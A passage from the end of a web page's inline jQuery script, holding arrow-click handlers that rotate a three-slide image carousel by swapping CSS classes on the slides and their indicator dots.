            slide_2.addClass("slider_inactive");
            point_2.addClass('point_inactive');
            return false;
        }

        if(slider_counter == 2){
            slider_counter = 1;
            slide_1.removeClass("slider_inactive");
            point_1.removeClass("point_inactive");
            slide_1.addClass("slider_active");
            point_1.addClass('point_active');
            slide_2.addClass("slider_inactive");
            point_2.addClass('point_inactive');
            slide_3.addClass("slider_inactive");
            point_3.addClass('point_inactive');
            return false;
        }

        if(slider_counter == 3){
            slider_counter = 2;
            slide_2.removeClass("slider_inactive");
            point_2.removeClass("point_inactive");
            slide_2.addClass("slider_active");
            point_2.addClass('point_active');
            slide_1.addClass("slider_inactive");
            point_1.addClass('point_inactive');
            slide_3.addClass("slider_inactive");
            point_3.addClass('point_inactive');
            return false;
        }
    });



    right_arrow.on('click', function(){
        if(slider_counter == 1){
            slider_counter = 2;
            slide_2.removeClass("slider_inactive");
            point_2.removeClass("point_inactive");
            slide_2.addClass("slider_active");
            point_2.addClass('point_active');
            slide_1.addClass("slider_inactive");
            point_1.addClass('point_inactive');
            slide_3.addClass("slider_inactive");
            point_3.addClass('point_inactive');
            return false;
        }

        if(slider_counter == 2){
            slider_counter = 3;
            slide_3.removeClass("slider_inactive");
            point_3.removeClass("point_inactive");
            slide_3.addClass("slider_active");
            point_3.addClass('point_active');
            slide_1.addClass("slider_inactive");
            point_1.addClass('point_inactive');
            slide_2.addClass("slider_inactive");
            point_2.addClass('point_inactive');
            return false;
        }

        if(slider_counter == 3){
            slider_counter = 1;
            slide_1.removeClass("slider_inactive");
            point_1.removeClass("point_inactive");
            slide_1.addClass("slider_active");
            point_1.addClass('point_active');
            slide_2.addClass("slider_inactive");
            point_2.addClass('point_inactive');
            slide_3.addClass("slider_inactive");
            point_3.addClass('point_inactive');
            return false;
        }
    });


</script>


</body>
</html>